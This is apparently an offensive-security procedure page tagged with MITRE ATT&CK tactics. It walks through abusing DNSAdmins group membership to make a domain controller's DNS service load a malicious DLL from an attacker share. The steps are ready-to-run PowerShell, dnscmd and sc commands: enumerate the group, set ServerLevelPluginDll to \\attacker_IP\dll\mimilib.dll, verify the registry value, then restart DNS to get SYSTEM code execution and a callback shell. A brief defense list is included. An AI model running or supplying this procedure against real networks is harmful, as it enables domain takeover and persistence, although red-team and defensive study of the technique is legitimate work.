---
id: 8a761063-8d65-4d76-89cd-e009cec4511e
name: Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.490396+00:00'
updated_at: '2023-10-10T20:26:10.299689+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Impact|TA0040 - Impact]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/DLL Search Order Hijacking|T1038 - DLL Search Order Hijacking]]'
  - '[[techniques/Service Execution|T1035 - Service Execution]]'
  - '[[techniques/Service Stop|T1489 - Service Stop]]'
sub_techniques: []
tags:
  - '[[tags/Abusing DNS Admins Group]]'
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Groups]]'
commands:
  - '[[commands/Get-DNSAdmins-Members-NetGroup]]'
  - '[[commands/Get-DNSAdmins-Members-ADGroup]]'
  - '[[commands/Configure-DNS-DLL-Path-RSAT]]'
  - '[[commands/Get-DNSServer-Settings]]'
  - '[[commands/Set-DNSServer-Plugin-DLL]]'
  - '[[commands/Verify-DNS-Plugin-DLL-Registry]]'
  - '[[commands/Stop-DNS-Service-DC01]]'
  - '[[commands/Start-DNS-Service-DC01]]'
platforms:
  - Windows
tools: []
validated: true
---

# Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation

## Summary

This procedure exploits membership in the DNSAdmins Active Directory group to perform DLL search order hijacking on the DNS Server service, allowing execution of arbitrary code with SYSTEM privileges. It involves enumerating group members, configuring the DNS service to load a malicious DLL from a controlled path, verifying the configuration, and restarting the service to trigger the load.

## Description

In Active Directory environments, the DNSAdmins group grants permissions to modify DNS server configurations, including the ability to specify a custom DLL for the ServerLevelPluginDll registry key. Attackers with DNSAdmins membership can abuse this to point the DNS service to a malicious DLL hosted on an attacker-controlled share, leading to code execution when the service restarts. This technique leverages DLL search order hijacking (T1038) to execute the payload under the DNS service's SYSTEM context, enabling persistence, privilege escalation, and potential domain compromise. The target is typically a Domain Controller or DNS server in a Windows Active Directory domain.

## Requirements

1. Domain user account with membership in the DNSAdmins group.
2. Network access to the target DNS server (e.g., Domain Controller) and ability to host a malicious DLL on a SMB share accessible by the target.
3. PowerShell execution rights on a domain-joined machine with Active Directory module or PowerView loaded.
4. RSAT tools or DNS Server PowerShell module installed for configuration commands.
5. Malicious DLL prepared (e.g., using Mimikatz or custom payload) and hosted on an SMB share.

## Defense

- Strictly limit DNSAdmins group membership to essential administrators and monitor additions/removals.
- Enable advanced auditing for registry changes under HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters.
- Implement AppLocker or WDAC to restrict DLL loading by the DNS service and monitor for unsigned DLLs in search paths.
- Regularly audit DNS service configurations and SMB share access from domain accounts.
- Use tools like Microsoft Defender for Identity to detect anomalous group modifications and service restarts.

## Objectives

1. Identify accounts or machines eligible for DNSAdmins abuse to target privilege escalation.
2. Configure the DNS service to load a malicious DLL, hijacking its execution flow.
3. Achieve SYSTEM-level code execution on the DNS server for further domain dominance.
4. Establish persistence via the DNS service for ongoing access.

## Instructions

### Step 1: Enumerate DNSAdmins Group Members

**Context**: Begin by identifying members of the DNSAdmins group to confirm eligibility and select a target account or machine for the abuse. Use PowerView or AD cmdlets to query the group, as this reveals users who can perform the configuration.

**Command** ([[commands/Get-DNSAdmins-Members-NetGroup]]):
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"
```

> This retrieves members using PowerView. Expected output: A list of user or computer objects in the group, including SIDs and names. If the current user is listed, proceed; otherwise, target a listed member.

**Command** ([[commands/Get-DNSAdmins-Members-ADGroup]]):
```powershell
Get-ADGroupMember -Identity DNSAdmins
```

> Alternative using native AD module. Expected output: Similar list of distinguished names and object classes. Success if current context or target is confirmed as a member.

### Step 2: Configure Malicious DLL Path Using RSAT or DNSServer Module

**Context**: Set the ServerLevelPluginDll registry value to point to a malicious DLL on an attacker-controlled SMB share. This exploits the DNS service's DLL loading behavior. Use either dnscmd (RSAT) for direct config or PowerShell DNSServer module for scripted changes. Prepare the DLL (e.g., privesc.dll) on \\attacker_IP\share\.

**Command** ([[commands/Configure-DNS-DLL-Path-RSAT]]):
```powershell
dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
```

> Using RSAT's dnscmd. Replace <servername> with target DNS server (e.g., DC01) and \\attacker_IP\dll\mimilib.dll with your share path. Expected output: "Command completed successfully." Verify no errors in DNS event logs.

Alternatively, for DNSServer module:

**Command** ([[commands/Get-DNSServer-Settings]]):
```powershell
$dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
```

> Retrieves current settings. Expected output: Object with current configuration, including existing ServerLevelPluginDll if set.

**Command** ([[commands/Set-DNSServer-Plugin-DLL]]):
```powershell
$dnsettings.ServerLevelPluginDll = "\\attacker_IP\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
```

> Updates and applies the setting. Expected output: Confirmation of update with no errors. This modifies the registry indirectly.

### Step 3: Verify DLL Configuration in Registry

**Context**: Confirm the ServerLevelPluginDll value is set correctly in the registry to ensure the hijacking will trigger on service restart.

**Command** ([[commands/Verify-DNS-Plugin-DLL-Registry]]):
```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name ServerLevelPluginDll
```

> Queries the registry directly. Expected output: The property value showing your malicious DLL path (e.g., \\attacker_IP\dll\mimilib.dll). If empty or incorrect, re-run configuration.

### Step 4: Restart DNS Service to Trigger DLL Load

**Context**: Stop and start the DNS service to force it to load the configured DLL, executing the payload with SYSTEM privileges. Monitor your listener for the reverse shell or other payload activation.

**Command** ([[commands/Stop-DNS-Service-DC01]]):
```powershell
sc \\dc01 stop dns
```

> Stops the service on DC01 (replace with target). Expected output: Service stopping message; wait for completion.

**Command** ([[commands/Start-DNS-Service-DC01]]):
```powershell
sc \\dc01 start dns
```

> Starts the service. Expected output: Service starting message. Success if payload executes (e.g., shell connects back).
